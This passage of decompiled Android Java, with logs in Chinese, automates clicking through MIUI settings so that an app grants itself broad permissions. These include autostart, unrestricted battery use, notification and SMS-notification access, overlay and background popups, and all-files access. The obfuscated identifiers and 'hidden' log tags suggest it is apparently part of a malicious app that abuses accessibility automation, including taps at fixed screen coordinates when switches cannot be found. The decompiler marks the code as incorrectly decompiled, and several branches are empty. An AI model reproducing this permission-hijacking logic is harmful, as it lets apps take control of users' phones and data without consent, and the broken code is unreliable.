                coroutineSingletons = coroutineSingletons2;
                str4 = "╚══════════════════════════════════════════════════════════════════════════";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                j2 = j19;
                j = j18;
                long jCurrentTimeMillis52 = System.currentTimeMillis() - j;
                String str222 = str19;
                StringBuilder sb22 = new StringBuilder("│ ✅ 基础权限完成！耗时: ");
                sb22.append(jCurrentTimeMillis52);
                str5 = str3;
                sb22.append(str5);
                c0367a4.m212274d8(sb22.toString());
                c0367a4.f55109a3.m214207a9(miuiSteps$FlowType15);
                str19 = str222;
                jCurrentTimeMillis = j2;
                c0367a4.m212274d8("");
                c0367a4.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a4.m212274d8("│ 📍 步骤1-12: 电池设置");
                c0367a4.m212274d8("│ 🎯 目标: 打开设置 → 省电与电池 → 关闭省电模式 → 更多电池功能 → 关闭各项开关");
                c0367a4.m212274d8("│ ⏱️ 开始执行...");
                c0367a4.m212274d8("└──────────────────────────────────────────────────────────────────────────");
                miuiSteps$FlowType4 = miuiSteps$FlowType2;
                if (!c0367a4.f55109a3.m214204a5(miuiSteps$FlowType4)) {
                }
                break;
            case 2:
                miuiSteps$FlowType = miuiSteps$FlowType13;
                long j20 = miuiSteps$execute$1.f54318a3;
                long j21 = miuiSteps$execute$1.f54317a2;
                String str26 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                str5 = "ms";
                obj = obj4;
                miuiSteps$FlowType3 = miuiSteps$FlowType12;
                coroutineSingletons = coroutineSingletons2;
                str4 = "╚══════════════════════════════════════════════════════════════════════════";
                str6 = "└──────────────────────────────────────────────────────────────────────────";
                j4 = j21;
                j3 = j20;
                str7 = str26;
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType4 = miuiSteps$FlowType14;
                zBooleanValue = ((Boolean) obj).booleanValue();
                long jCurrentTimeMillis72 = System.currentTimeMillis() - j3;
                if (zBooleanValue) {
                }
                jCurrentTimeMillis = j4;
                str9 = str7;
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤13: 自启动开关");
                c0367a42.m212274d8("│ 🎯 目标: 打开应用详情 → 查找自启动 → 开启开关");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                String str2322 = str6;
                c0367a42.m212274d8(str2322);
                miuiSteps$FlowType5 = miuiSteps$FlowType;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType5)) {
                }
                break;
            case 3:
                long j22 = miuiSteps$execute$1.f54318a3;
                long j23 = miuiSteps$execute$1.f54317a2;
                String str27 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                coroutineSingletons = coroutineSingletons2;
                objM212255b4 = obj4;
                miuiSteps$FlowType3 = miuiSteps$FlowType12;
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType5 = miuiSteps$FlowType13;
                str12 = str27;
                str5 = "ms";
                str11 = "╠══════════════════════════════════════════════════════════════════════════";
                j6 = j23;
                j5 = j22;
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType4 = miuiSteps$FlowType14;
                str10 = "└──────────────────────────────────────────────────────────────────────────";
                zBooleanValue2 = ((Boolean) objM212255b4).booleanValue();
                long jCurrentTimeMillis92 = System.currentTimeMillis() - j5;
                if (zBooleanValue2) {
                }
                str9 = str12;
                jCurrentTimeMillis = j9;
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤13.5: 省电策略");
                c0367a42.m212274d8("│ 🎯 目标: 打开MIUI省电策略页面 → 点击无限制");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                str13 = str10;
                c0367a42.m212274d8(str13);
                str14 = str11;
                miuiSteps$FlowType6 = miuiSteps$FlowType3;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType6)) {
                }
                break;
            case 4:
                miuiSteps$FlowType7 = miuiSteps$FlowType13;
                miuiSteps$FlowType8 = miuiSteps$FlowType14;
                long j24 = miuiSteps$execute$1.f54318a3;
                long j25 = miuiSteps$execute$1.f54317a2;
                String str28 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                str5 = "ms";
                str14 = "╠══════════════════════════════════════════════════════════════════════════";
                str13 = "└──────────────────────────────────────────────────────────────────────────";
                miuiSteps$FlowType6 = miuiSteps$FlowType12;
                coroutineSingletons = coroutineSingletons2;
                str9 = str28;
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                j8 = j25;
                j7 = j24;
                zBooleanValue3 = ((Boolean) obj4).booleanValue();
                long jCurrentTimeMillis112 = System.currentTimeMillis() - j7;
                if (zBooleanValue3) {
                }
                jCurrentTimeMillis = j8;
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤14-15: 通知管理");
                c0367a42.m212274d8("│ 🎯 目标: 打开通知管理 → 开启允许通知 → 滚动查找通知类别OFF → 关闭");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                c0367a42.m212274d8(str13);
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType9)) {
                }
                break;
            case 5:
                miuiSteps$FlowType7 = miuiSteps$FlowType13;
                miuiSteps$FlowType8 = miuiSteps$FlowType14;
                int i7 = miuiSteps$execute$1.f54320a5;
                long j26 = miuiSteps$execute$1.f54318a3;
                int i8 = miuiSteps$execute$1.f54319a4;
                j11 = miuiSteps$execute$1.f54317a2;
                String str29 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                coroutineSingletons = coroutineSingletons2;
                str9 = str29;
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                i2 = i8;
                str5 = "ms";
                str14 = "╠══════════════════════════════════════════════════════════════════════════";
                str15 = "└──────────────────────────────────────────────────────────────────────────";
                i = i7;
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                str16 = "│ ⏱️ 开始执行...";
                miuiSteps$FlowType10 = miuiSteps$FlowType15;
                str17 = "┌──────────────────────────────────────────────────────────────────────────";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                j12 = j26;
                miuiSteps$execute$1.f54315a0 = c0367a42;
                miuiSteps$execute$1.f54316a1 = str9;
                miuiSteps$execute$1.f54317a2 = j11;
                miuiSteps$execute$1.f54319a4 = i2;
                miuiSteps$execute$1.f54318a3 = j12;
                miuiSteps$execute$1.f54320a5 = i;
                miuiSteps$execute$1.f54323a8 = 6;
                str18 = str9;
                j13 = j12;
                break;
            case 6:
                miuiSteps$FlowType7 = miuiSteps$FlowType13;
                miuiSteps$FlowType8 = miuiSteps$FlowType14;
                int i9 = miuiSteps$execute$1.f54320a5;
                long j27 = miuiSteps$execute$1.f54318a3;
                int i10 = miuiSteps$execute$1.f54319a4;
                j11 = miuiSteps$execute$1.f54317a2;
                String str30 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                str5 = "ms";
                str14 = "╠══════════════════════════════════════════════════════════════════════════";
                str15 = "└──────────────────────────────────────────────────────────────────────────";
                i = i9;
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                j13 = j27;
                str16 = "│ ⏱️ 开始执行...";
                str17 = "┌──────────────────────────────────────────────────────────────────────────";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType10 = miuiSteps$FlowType15;
                str18 = str30;
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                i2 = i10;
                coroutineSingletons = coroutineSingletons2;
                og1 og1Var2 = c0367a42.f55109a3;
                og1Var2.m214200a0("miui_notification_page_opened");
                og1Var2.m214200a0("miui_notification_switch_done");
                og1Var2.m214200a0("miui_notification_category_done");
                j14 = j13;
                miuiSteps$execute$1.f54315a0 = c0367a42;
                miuiSteps$execute$1.f54316a1 = str18;
                miuiSteps$execute$1.f54317a2 = j11;
                miuiSteps$execute$1.f54319a4 = i2;
                miuiSteps$execute$1.f54318a3 = j14;
                miuiSteps$execute$1.f54320a5 = i;
                miuiSteps$execute$1.f54323a8 = 7;
                objM212259b8 = c0367a42.m212259b8(miuiSteps$execute$1);
                if (objM212259b8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                int i11 = miuiSteps$execute$1.f54320a5;
                miuiSteps$FlowType7 = miuiSteps$FlowType13;
                miuiSteps$FlowType8 = miuiSteps$FlowType14;
                long j28 = miuiSteps$execute$1.f54318a3;
                int i12 = miuiSteps$execute$1.f54319a4;
                long j29 = miuiSteps$execute$1.f54317a2;
                String str31 = miuiSteps$execute$1.f54316a1;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                str5 = "ms";
                str14 = "╠══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                str16 = "│ ⏱️ 开始执行...";
                obj2 = obj4;
                str15 = "└──────────────────────────────────────────────────────────────────────────";
                i = i11;
                miuiSteps$FlowType10 = miuiSteps$FlowType15;
                j10 = j29;
                coroutineSingletons = coroutineSingletons2;
                str9 = str31;
                str17 = "┌──────────────────────────────────────────────────────────────────────────";
                i2 = i12;
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                jCurrentTimeMillis2 = j28;
                if (((Boolean) obj2).booleanValue()) {
                }
                miuiSteps$execute$1 = miuiSteps$execute$13;
                c0367a42.m212274d8("");
                c0367a42.m212274d8(str17);
                c0367a42.m212274d8("│ 📍 步骤16: 权限管理/文件权限");
                c0367a42.m212274d8("│ 🎯 目标: 权限管理（通知类短信/后台弹出/悬浮窗）+ 所有文件管理权限");
                c0367a42.m212274d8(str16);
                c0367a42.m212274d8(str15);
                miuiSteps$FlowType11 = miuiSteps$FlowType16;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType11)) {
                }
                break;
            case 8:
                long j30 = miuiSteps$execute$1.f54318a3;
                long j31 = miuiSteps$execute$1.f54317a2;
                c0367a42 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                str5 = "ms";
                str14 = "╠══════════════════════════════════════════════════════════════════════════";
                str8 = "╚══════════════════════════════════════════════════════════════════════════";
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                miuiSteps$FlowType7 = miuiSteps$FlowType13;
                miuiSteps$FlowType10 = miuiSteps$FlowType15;
                objM212260b9 = obj4;
                miuiSteps$FlowType11 = miuiSteps$FlowType16;
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                coroutineSingletons = coroutineSingletons2;
                jCurrentTimeMillis3 = j30;
                miuiSteps$FlowType8 = miuiSteps$FlowType14;
                j10 = j31;
                boolean zBooleanValue4 = ((Boolean) objM212260b9).booleanValue();
                long jCurrentTimeMillis13 = System.currentTimeMillis() - jCurrentTimeMillis3;
                if (zBooleanValue4) {
                    c0367a42.m212274d8("│ ✅ 步骤16 成功！耗时: " + jCurrentTimeMillis13 + str5);
                    c0367a42.f55109a3.m214207a9(miuiSteps$FlowType11);
                } else {
                    c0367a42.m212274d8("│ ❌ 步骤16 失败！耗时: " + jCurrentTimeMillis13 + str5);
                }
                MiuiSteps$execute$1 miuiSteps$execute$142 = miuiSteps$execute$1;
                c0367a43 = c0367a42;
                long jCurrentTimeMillis122 = System.currentTimeMillis() - j10;
                og1 og1Var3 = c0367a43.f55109a3;
                Context context22 = c0367a43.f55107a1;
                MiuiSteps$FlowType miuiSteps$FlowType182 = miuiSteps$FlowType8;
                if (!og1Var3.m214204a5(miuiSteps$FlowType182)) {
                    c0367a43.m212274d8("");
                    c0367a43.m212274d8(str2);
                    c0367a43.m212274d8("║ 📊 执行结果汇总");
                    String str242 = str14;
                    c0367a43.m212274d8(str242);
                    c0367a43.m212274d8("║ 基础权限:        ".concat(!og1Var3.m214204a5(miuiSteps$FlowType10) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 电池设置:        ".concat(!og1Var3.m214204a5(miuiSteps$FlowType182) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 自启动:          ".concat(!og1Var3.m214204a5(miuiSteps$FlowType7) ? "✅" : "⚠️"));
                    c0367a43.m212274d8("║ 通知管理:        ".concat(!og1Var3.m214204a5(miuiSteps$FlowType9) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 权限/文件:       ".concat(!og1Var3.m214204a5(miuiSteps$FlowType11) ? "✅" : "❌"));
                    c0367a43.m212274d8(str242);
                    ?? r52 = "║ ⏱️ 总耗时: ";
                    c0367a43.m212274d8("║ ⏱️ 总耗时: " + jCurrentTimeMillis122 + str5);
                    c0367a43.m212274d8("║ 🏁 结果: ".concat(i3 == 0 ? "✅ 完成" : "⚠️ 未完成"));
                    c0367a43.m212274d8(str8);
                    if (i3 != 0) {
                    }
                    break;
                }
                return Boolean.valueOf(i3 == 0 ? z : false);
            case 9:
                i4 = miuiSteps$execute$1.f54319a4;
                c0367a43 = miuiSteps$execute$1.f54315a0;
                try {
                    kg1.m213544f4(obj4);
                    z3 = true;
                } catch (Exception e3) {
                    e = e3;
                    z2 = true;
                    AbstractC0003a2.m45c6("[隐藏] ⚠️ 启动失败: ", e.getMessage(), c0367a43);
                    z3 = z2;
                    i3 = i4;
                    z = z3;
                    return Boolean.valueOf(i3 == 0 ? z : false);
                }
                i3 = i4;
                z = z3;
                return Boolean.valueOf(i3 == 0 ? z : false);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:29|(3:31|(4:34|(1:36)(1:37)|38|(3:41|42|(6:(1:47)(1:48)|49|114|50|53|(3:56|57|(2:59|60)(3:61|62|(1:64)(1:(2:71|(3:74|75|(2:77|(5:80|81|(1:86)|(2:91|92)(1:92)|(2:103|(3:(2:108|(2:110|(0)))(1:111)|112|113)(2:105|106))(2:94|(5:97|98|(1:100)(1:101)|102|(0)(0)))))(5:82|83|(0)|(0)(0)|(0)(0))))(5:84|83|(0)|(0)(0)|(0)(0))))))))|96)|45|(0)(0)|49|114|50|53|(0)|96) */
    /* JADX WARN: Code restructure failed: missing block: B:116:0x033a, code lost:
    
        r9 = new kotlin.jvm.internal.Ref$BooleanRef();
        r15 = r1;
        r10 = r4;
        r4 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x01e1, code lost:
    
        r13 = new android.content.Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
        r13.setFlags(276824064);
        r9.startActivity(r13);
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x026a, code lost:
    
        if (r15 == r3) goto L96;
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x0327, code lost:
    
        if (p000.b81.m210571b1(150, r2) == r3) goto L96;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x0360  */
    /* JADX WARN: Removed duplicated region for block: B:101:0x037e  */
    /* JADX WARN: Removed duplicated region for block: B:103:0x039e  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00e4  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x0118  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x013d  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x017b  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0198 A[PHI: r1 r2 r4 r5 r8 r12
      0x0198: PHI (r1v28 int) = (r1v14 int), (r1v30 int) binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]
      0x0198: PHI (r2v14 com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$executeAllFilesAccessFlow$1) = 
      (r2v3 com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$executeAllFilesAccessFlow$1)
      (r2v17 com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$executeAllFilesAccessFlow$1)
     binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]
      0x0198: PHI (r4v31 int) = (r4v12 int), (r4v32 int) binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]
      0x0198: PHI (r5v26 int) = (r5v10 int), (r5v27 int) binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]
      0x0198: PHI (r8v23 com.storm.safe.rock.service.modules.yw5xud.a4) = (r8v9 com.storm.safe.rock.service.modules.yw5xud.a4), (r8v25 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]
      0x0198: PHI (r12v12 java.lang.String) = (r12v1 java.lang.String), (r12v13 java.lang.String) binds: [B:45:0x0197, B:43:0x0193] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x019a  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x019d  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x020d  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0217  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0224  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0246  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x028f  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x02b8  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x02d4  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x02d8  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x02dd  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x032d  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0332  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x033c  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:68:0x0274 -> B:62:0x0240). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:97:0x0359 -> B:98:0x035a). Please report as a decompilation issue!!! */
    /* renamed from: b3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212254b3(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeAllFilesAccessFlow$1 miuiSteps$executeAllFilesAccessFlow$1;
        C0367a4 c0367a4;
        int i;
        int i2;
        C0367a4 c0367a42;
        int i3;
        int i4;
        int i5;
        int i6;
        String str;
        Iterator it;
        C0367a4 c0367a43;
        Object objM212285f0;
        int i7;
        int i8;
        Object objM212262c1;
        int i9;
        Ref$BooleanRef ref$BooleanRef;
        int i10;
        int i11;
        int i12;
        MiuiSteps$executeAllFilesAccessFlow$1 miuiSteps$executeAllFilesAccessFlow$12;
        C0367a4 c0367a44;
        MiuiSteps$executeAllFilesAccessFlow$1 miuiSteps$executeAllFilesAccessFlow$13;
        C0367a4 c0367a45;
        int i13;
        if (continuationImpl instanceof MiuiSteps$executeAllFilesAccessFlow$1) {
            miuiSteps$executeAllFilesAccessFlow$1 = (MiuiSteps$executeAllFilesAccessFlow$1) continuationImpl;
            int i14 = miuiSteps$executeAllFilesAccessFlow$1.f54334b0;
            if ((i14 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = i14 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeAllFilesAccessFlow$1 = new MiuiSteps$executeAllFilesAccessFlow$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$executeAllFilesAccessFlow$1.f54332a8;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i15 = miuiSteps$executeAllFilesAccessFlow$1.f54334b0;
        int i16 = 2;
        MiuiSteps$FlowType miuiSteps$FlowType = MiuiSteps$FlowType.ALL_FILES_ACCESS;
        String str2 = null;
        int i17 = 1;
        switch (i15) {
            case 0:
                kg1.m213544f4(obj);
                m212274d8("[文件访问] ★★★ 开始执行 ★★★");
                if (Build.VERSION.SDK_INT < 30) {
                    return Boolean.TRUE;
                }
                if (Environment.isExternalStorageManager()) {
                    m212274d8("[文件访问] ✅ 已开启，跳过");
                    this.f55109a3.m214207a9(miuiSteps$FlowType);
                    return Boolean.TRUE;
                }
                c0367a4 = this;
                i = 2;
                i2 = 0;
                if (i2 > 0) {
                    c0367a4.m212274d8(AbstractC0003a2.m31b2("[文件访问] 🔄 重试第", i2, "次（总共最多", i + 1, "次）..."));
                    miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                    miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                    miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                    miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                    miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                    miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = i17;
                    if (b81.m210571b1(500L, miuiSteps$executeAllFilesAccessFlow$1) != coroutineSingletons) {
                        c0367a4.m212274d8("[文件访问] 📱 重新打开应用详情页面...");
                        Context context = c0367a4.f55107a1;
                        if (Build.VERSION.SDK_INT < 35) {
                            Intent intent = new Intent();
                            intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.miui.appmanager.ApplicationsDetailsActivity"));
                            intent.putExtra("package_name", context.getPackageName());
                            intent.setFlags(1350631424);
                            context.startActivity(intent);
                        } else {
                            Intent intent2 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                            intent2.setData(Uri.parse("package:" + context.getPackageName()));
                            intent2.setFlags(1350631424);
                            context.startActivity(intent2);
                        }
                        miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                        miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                        miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                        miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = i16;
                        miuiSteps$executeAllFilesAccessFlow$13 = miuiSteps$executeAllFilesAccessFlow$1;
                        c0367a45 = c0367a4;
                        if (c0367a45.m212294f9(2, 100L, 2000L, miuiSteps$executeAllFilesAccessFlow$13) != coroutineSingletons) {
                            c0367a4 = c0367a45;
                            miuiSteps$executeAllFilesAccessFlow$1 = miuiSteps$executeAllFilesAccessFlow$13;
                            c0367a4.m212274d8("[文件访问] ✅ 应用详情页面已重新打开");
                            miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                            miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                            miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                            i3 = 3;
                            miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 3;
                            if (b81.m210571b1(300L, miuiSteps$executeAllFilesAccessFlow$1) != coroutineSingletons) {
                                c0367a4.m212274d8("[文件访问] " + (i2 == 0 ? "打开" : "重新打开") + "设置页面");
                                Context context2 = c0367a4.f55107a1;
                                Intent intent3 = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                                intent3.setData(Uri.parse("package:" + context2.getPackageName()));
                                intent3.setFlags(276824064);
                                context2.startActivity(intent3);
                                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                                miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                                miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i2;
                                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 4;
                                miuiSteps$executeAllFilesAccessFlow$12 = miuiSteps$executeAllFilesAccessFlow$1;
                                c0367a44 = c0367a4;
                                if (c0367a44.m212294f9(2, 100L, 1500L, miuiSteps$executeAllFilesAccessFlow$12) != coroutineSingletons) {
                                    c0367a42 = c0367a44;
                                    miuiSteps$executeAllFilesAccessFlow$1 = miuiSteps$executeAllFilesAccessFlow$12;
                                    if (!Environment.isExternalStorageManager()) {
                                        c0367a42.m212274d8("[文件访问] ✅ 已开启");
                                        c0367a42.f55109a3.m214207a9(miuiSteps$FlowType);
                                        return Boolean.TRUE;
                                    }
                                    c0367a42.m212274d8("[文件访问] 查找开关");
                                    c0367a43 = c0367a42;
                                    it = AbstractC0716jf.m213306g5("授予管理", "管理所有文件", "授予管理所有文件的权限").iterator();
                                    i6 = i;
                                    i5 = i2;
                                    i4 = 0;
                                    if (!it.hasNext()) {
                                        str = (String) it.next();
                                        AbstractC0003a2.m45c6("[文件访问] 尝试通过文本找开关: ", str, c0367a43);
                                        miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a43;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = it;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i6;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i5;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54329a5 = i4;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 5;
                                        AbstractC0003a2.m45c6("│ │   [开启开关] ", str, c0367a43);
                                        objM212285f0 = c0367a43.m212285f0(str, true, miuiSteps$executeAllFilesAccessFlow$1);
                                        break;
                                    } else if (i4 != 0) {
                                        c0367a43.m212274d8("[文件访问] 文本方式失败，尝试直接查找Switch控件...");
                                        miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a43;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i6;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i5;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54329a5 = i4;
                                        miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 6;
                                        objM212262c1 = c0367a43.m212262c1(miuiSteps$executeAllFilesAccessFlow$1);
                                        if (objM212262c1 != coroutineSingletons) {
                                            int i18 = i5;
                                            i7 = i4;
                                            i8 = i18;
                                            if (((Boolean) objM212262c1).booleanValue()) {
                                                i9 = i7;
                                                i = i6;
                                                c0367a4 = c0367a43;
                                                if (i9 == 0) {
                                                }
                                                if (i9 == 0) {
                                                }
                                                if (i12 >= i10) {
                                                }
                                            } else {
                                                miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a43;
                                                miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i6;
                                                miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i8;
                                                miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 7;
                                                if (b81.m210571b1(150L, miuiSteps$executeAllFilesAccessFlow$1) != coroutineSingletons) {
                                                    i = i6;
                                                    c0367a4 = c0367a43;
                                                    c0367a4.m212274d8("[文件访问] ✅ Switch控件已点击");
                                                    i9 = 1;
                                                    if (i9 == 0) {
                                                        c0367a4.m212274d8("[文件访问] Switch查找失败，尝试固定坐标点击...");
                                                        Context context3 = c0367a4.f55107a1;
                                                        float f = context3.getResources().getDisplayMetrics().widthPixels * 0.875f;
                                                        float f2 = context3.getResources().getDisplayMetrics().heightPixels * 0.225f;
                                                        c0367a4.m212274d8(AbstractC0003a2.m29b0("[文件访问] 🎯 坐标点击: (", f, ", ", f2, ")"));
                                                        c0367a4.m212277e2(f, f2, 100L);
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = str2;
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54326a2 = str2;
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54327a3 = i;
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54328a4 = i8;
                                                        miuiSteps$executeAllFilesAccessFlow$1.f54334b0 = 8;
                                                        break;
                                                    }
                                                    if (i9 == 0) {
                                                        c0367a4.m212274d8("[文件访问] ⚠️ 未能找到开关");
                                                        ref$BooleanRef = new Ref$BooleanRef();
                                                        i10 = i3;
                                                        i11 = i8;
                                                        i12 = 0;
                                                    } else {
                                                        ref$BooleanRef = new Ref$BooleanRef();
                                                        i10 = i3;
                                                        i11 = i8;
                                                        i12 = 0;
                                                    }
                                                    if (i12 >= i10) {
                                                        if (ref$BooleanRef.f57622a0) {
                                                            c0367a4.f55109a3.m214207a9(miuiSteps$FlowType);
                                                            return Boolean.TRUE;
                                                        }
                                                        if (i11 < i) {
                                                            i2 = i11 + 1;
                                                            c0367a4.m212274d8("[文件访问] ⚠️ 第" + i2 + "次尝试失败，将重试...");
                                                            if (i11 != i) {
                                                                i16 = 2;
                                                                str2 = null;
                                                                i17 = 1;
                                                                if (i2 > 0) {
                                                                }
                                                            }
                                                        } else {
                                                            c0367a4.m212274d8("[文件访问] ⚠️ 所有重试（" + (i + 1) + "次）均失败，未能确认权限开启，可能需要手动确认");
                                                        }
                                                        c0367a4.f55109a3.m214207a9(miuiSteps$FlowType);
                                                        return Boolean.TRUE;
                                                    }
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54324a0 = c0367a4;
                                                    miuiSteps$executeAllFilesAccessFlow$1.f54325a1 = ref$BooleanRef;
